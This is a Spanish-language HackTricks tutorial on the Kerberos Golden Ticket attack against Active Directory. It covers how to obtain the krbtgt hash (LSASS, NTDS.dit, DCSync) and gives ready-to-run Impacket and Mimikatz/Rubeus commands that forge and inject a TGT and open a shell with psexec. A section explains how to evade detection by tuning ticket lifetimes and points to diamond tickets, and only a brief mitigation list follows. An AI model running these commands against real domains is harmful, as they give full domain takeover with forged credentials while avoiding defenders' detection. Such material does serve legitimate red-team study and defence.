# Ticket Dorado

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Ticket Dorado

Un ataque de **Ticket Dorado** consiste en la **creación de un Ticket Granting Ticket (TGT) legítimo suplantando a cualquier usuario** mediante el uso del **hash NTLM de la cuenta krbtgt de Active Directory (AD)**. Esta técnica es particularmente ventajosa porque **permite el acceso a cualquier servicio o máquina** dentro del dominio como el usuario suplantado. Es crucial recordar que las **credenciales de la cuenta krbtgt nunca se actualizan automáticamente**.

Para **adquirir el hash NTLM** de la cuenta krbtgt, se pueden emplear varios métodos. Puede extraerse del **proceso Local Security Authority Subsystem Service (LSASS)** o del archivo **NT Directory Services (NTDS.dit)** ubicado en cualquier Controlador de Dominio (DC) dentro del dominio. Además, **ejecutar un ataque DCsync** es otra estrategia para obtener este hash NTLM, que puede realizarse utilizando herramientas como el **módulo lsadump::dcsync** en Mimikatz o el **script secretsdump.py** de Impacket. Es importante destacar que para llevar a cabo estas operaciones, **normalmente se requieren privilegios de administrador de dominio o un nivel de acceso similar**.

Aunque el hash NTLM sirve como un método viable para este propósito, se **recomienda encarecidamente** **forjar tickets utilizando las claves de cifrado avanzado estándar (AES) de Kerberos (AES128 y AES256)** por razones de seguridad operativa.


{% code title="Desde Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Desde Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Una vez** que tienes el **Golden Ticket inyectado**, puedes acceder a los archivos compartidos **(C$)** y ejecutar servicios y WMI, por lo que podrías usar **psexec** o **wmiexec** para obtener una shell (parece que no se puede obtener una shell a través de winrm).

### Eludir detecciones comunes

Las formas más frecuentes de detectar un golden ticket son mediante **la inspección del tráfico de Kerberos** en la red. Por defecto, Mimikatz **firma el TGT por 10 años**, lo cual resaltará como anómalo en las solicitudes posteriores de TGS realizadas con él.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utiliza los parámetros `/startoffset`, `/endin` y `/renewmax` para controlar el inicio del desfase, la duración y el máximo de renovaciones (todo en minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Desafortunadamente, el tiempo de vida del TGT no se registra en el 4769, por lo que no encontrarás esta información en los registros de eventos de Windows. Sin embargo, lo que puedes correlacionar es **ver 4769 sin un 4768 previo**. **No es posible solicitar un TGS sin un TGT**, y si no hay registro de que se haya emitido un TGT, podemos inferir que fue falsificado sin conexión.

Para **burlar esta detección**, verifica los tickets diamond:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigación

* 4624: Inicio de sesión de cuenta
* 4672: Inicio de sesión de administrador
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Otros trucos que los defensores pueden hacer es **alertar sobre los 4769 para usuarios sensibles** como la cuenta de administrador de dominio predeterminada.

## Referencias
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
